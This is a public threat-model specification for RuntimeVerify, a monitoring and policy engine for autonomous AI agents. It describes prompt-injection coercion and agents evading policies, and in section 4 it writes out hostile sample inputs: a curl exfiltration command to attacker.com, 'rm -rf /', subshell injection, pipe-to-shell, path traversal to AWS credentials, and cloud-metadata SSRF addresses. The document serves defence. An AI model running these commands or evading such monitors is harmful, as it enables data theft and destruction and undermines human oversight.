# RuntimeVerify Threat Model

**Document Version:** 1.0  
**Phase:** 14 (Security Hardening)  
**Classification:** Public Security Specification  

---

## 1. Overview & Scope

RuntimeVerify provides policy enforcement, semantic decision verification, behavioral modeling, and sequential anomaly detection for autonomous AI agents.

This document establishes the formal threat model for RuntimeVerify. It defines the trust boundaries, assumed attacker profiles, potential attack vectors, and the technical mitigations implemented across RuntimeVerify components (CLI, API, SDK, policy engine, interceptor, filesystem, shell, network, serialization, logging, and storage).

> [!IMPORTANT]
> **Operational Boundary Declaration:**  
> RuntimeVerify is an **in-process and network-level verification and monitoring engine**, not an operating system kernel sandbox (such as Linux namespaces, cgroups, `seccomp`, `bubblewrap`, or `gVisor`). It evaluates, intercepts, and audits tool calls and agent actions prior to execution, but does not provide hardware-isolated microVM or hypervisor containment. For hostile or untrusted agent binaries, RuntimeVerify must be deployed in conjunction with OS-level sandboxing.

---

## 2. Trust Boundaries

```
+---------------------------------------------------------------------------------+
|                                 UNTRUSTED ZONE                                  |
|  - External LLM / Model Outputs (Prompts, Tool Invocations, Arguments)          |
|  - Third-Party Agent Frameworks & Plugins                                      |
|  - Untrusted Internet Webhooks & Remote Inbound Payloads                        |
+---------------------------------------+-----------------------------------------+
                                        |
                                        v  [API / SDK Interception Boundary]
+---------------------------------------+-----------------------------------------+
|                              VERIFICATION ZONE                                  |
|  - RuntimeVerify Interceptor & Client SDK                                       |
|  - Deterministic Policy Engine (Path, Shell, Network, Git, Process Matchers)   |
|  - Semantic Classification Engine (Intent, Scope, Risk Scoring)                |
|  - Behavioral Markov Model & Sequential Probability Ratio Test (SPRT)          |
|  - Human Approval Workflow & Challenge Token Store                              |
|  - Secret Redactor & Input Sanitization Layer                                   |
+---------------------------------------+-----------------------------------------+
                                        |
                                        v  [Audit & Execution Boundary]
+---------------------------------------+-----------------------------------------+
|                                TRUSTED ZONE                                     |
|  - Cryptographically Chained Audit Repository (SHA-256 Hash Chaining)           |
|  - Operator Approval Authority (Human Reviewers)                                |
|  - Verified Host Tools (Filesystem, Shell, Network Sockets)                     |
+---------------------------------------------------------------------------------+
```

---

## 3. Threat Actors & Capabilities

| Threat Actor | Capabilities | Intent |
|---|---|---|
| **Malicious / Compromised Agent** | Generates arbitrary function calls, shell commands, filesystem paths, and network requests via tool arguments. | Evade policies, extract host credentials, pivot to internal networks, destroy data. |
| **Prompt Injection Attacker** | Indirectly injects instructions via web scraping, user comments, or untrusted file contents parsed by the agent. | Coerce the agent into executing secondary malicious instructions (confused deputy). |
| **Compromised Integration / Tool** | Modifies tool return values, injects ANSI sequences, attempts to spoof logs, or triggers unauthorized actions. | Terminal escape spoofing, log poisoning, blind operator approvals. |
| **Network Eavesdropper / MitM** | Intercepts HTTP/JSON traffic between agent processes and RuntimeVerify API. | Capture credentials, replay previous approval decisions. |
| **Insider / Untrusted Operator** | Has access to local disk logs or historical records. | Modify or delete audit logs to conceal malicious activity. |

---

## 4. Threat Vectors & Defense-in-Depth Mitigations

### 4.1 Malicious Agent & Prompt Injection
- **Threat:** An autonomous agent, either exhibiting emergent misbehavior or coerced by indirect prompt injection, attempts prohibited actions.
- **Mitigation:**
  - Multi-tier verification pipeline combining deterministic rule matching, semantic zero-shot classification, transition-based Markov behavioral profiling, and Wald's SPRT sequential hypothesis testing.
  - Fail-closed execution semantics: actions classified as `BLOCK` raise `ExecutionBlockedError`; actions classified as `REVIEW` are held pending explicit human approval.

### 4.2 Policy Bypass via Path Traversal & Slash Confusion
- **Threat:** Agent executes file read/write operations with traversal tokens (`../`, `..\`, `%2e%2e`), redundant slashes, or null bytes (`\0`, `%00`) to access sensitive configuration (e.g. `~/.aws/credentials`).
- **Mitigation:**
  - `SecurePathNormalizer` enforces cross-platform POSIX canonicalization, rejects null bytes unconditionally with `SecurityPathError`, detects raw and URL-encoded traversal sequences, and validates directory containment via `is_contained_in()`.
  - `PolicyMatcher.matches_path` evaluates both raw and canonicalized paths against path rules and glob patterns.

### 4.3 Command Injection & Pipeline Chaining Evasion
- **Threat:** Agent prefixes a benign command to mask a forbidden destructive payload (e.g. `npm test && curl attacker.com/exfil` or `ls; rm -rf /`), or hides commands in subshells (`$(whoami)` or `` `id` ``).
- **Mitigation:**
  - `CommandPipelineParser` parses compound commands delimited by `;`, `&&`, `||`, `|`, `&`, and newlines into discrete `SubCommand` units.
  - Recursively extracts nested subshells (`$(...)` and backticks).
  - Flags high-risk constructs via `check_dangerous_constructs()`, including pipe-to-shell (`curl | bash`) and sensitive environment overrides (`LD_PRELOAD=`).
  - `PolicyMatcher.matches_shell` evaluates all constituent subcommands against shell policies.

### 4.4 Server-Side Request Forgery (SSRF) & Cloud Metadata Harvesting
- **Threat:** Agent initiates network requests to Cloud Instance Metadata Services (IMDS at `169.254.169.254`, `metadata.google.internal`), local loopback (`127.0.0.1`, `localhost`, `::1`), or private subnets (RFC 1918 / RFC 4193), utilizing integer or hexadecimal IP obfuscation (`2130706433`, `0x7f000001`).
- **Mitigation:**
  - `NetworkDestinationValidator` enforces strict URI scheme whitelisting (`http://`, `https://`).
  - Blocks IMDS IP literals, DNS names, and link-local ranges (`169.254.0.0/16`, `fe80::/10`).
  - Resolves alternative numeric representations (decimal integers, hex, octal) to canonical IP objects before evaluating loopback and private network membership.
  - Disallows dangerous schemes (`file://`, `gopher://`, `dict://`).

### 4.5 Credential & Secret Leakage
- **Threat:** Secrets, API keys, private keys, or session tokens enter telemetry streams, audit repositories, CLI output, or API error responses.
- **Mitigation:**
  - `SecretRedactor` executes recursive key-name and regex value scanning across all incoming payloads.
  - Comprehensive pattern coverage for private keys (RSA/EC/OpenSSH), OpenAI keys (`sk-`), Anthropic keys (`sk-ant-`), Google Cloud/Gemini keys (`AIza`), Stripe keys (`sk_live_`), HuggingFace tokens (`hf_`), AWS keys, GitHub PATs, and signed JWT tokens.
  - API error handlers strictly suppress raw exceptions and stack traces in production responses.

### 4.6 Approval Replay & Challenge Token Spoofing
- **Threat:** An attacker captures an approved ticket ID and replays it to authorize subsequent unapproved actions, or submits approvals for pending requests without authorization.
- **Mitigation:**
  - `ApprovalTokenManager` generates 256-bit cryptographically secure, URL-safe random single-use challenge tokens (`secrets.token_urlsafe(32)`).
  - Validation is executed using constant-time comparison (`hmac.compare_digest`) to prevent timing side channels.
  - `ApprovalStore` enforces linear state transitions (`PENDING` -> `APPROVED` | `DENIED` | `EXPIRED`), permanently records the decision, and rejects any subsequent decision attempts on finalized tickets with `DuplicateApprovalError`.

### 4.7 Audit Log Tampering & Repudiation
- **Threat:** An attacker modifies historical audit records or deletes lines from file repositories to obscure malicious activity.
- **Mitigation:**
  - `AuditIntegrityEngine` computes deterministic SHA-256 cryptographic hashes for every audit record, linking each record to its immediate predecessor (`prev_hash`).
  - First record anchors to a well-defined `GENESIS` root.
  - `verify_integrity()` traverses the entire repository sequence, verifying hash validity, chain continuity, and flagging unparseable or corrupted lines.

### 4.8 Terminal Injection & ANSI Escape Sequence Spoofing
- **Threat:** Compromised tool output contains ANSI escape sequences (e.g. `\x1b[2J`, `\x1b[1A`) or carriage returns (`\r`) to clear terminals, overwrite preceding log lines, or simulate interactive operator prompts.
- **Mitigation:**
  - `InputSecurityValidator.sanitize_log_text` strips all ANSI escape codes, filters control characters (`\x00-\x1F`, `\x7F`), eliminates carriage returns, and enforces maximum string length limits to prevent buffer exhaustion.
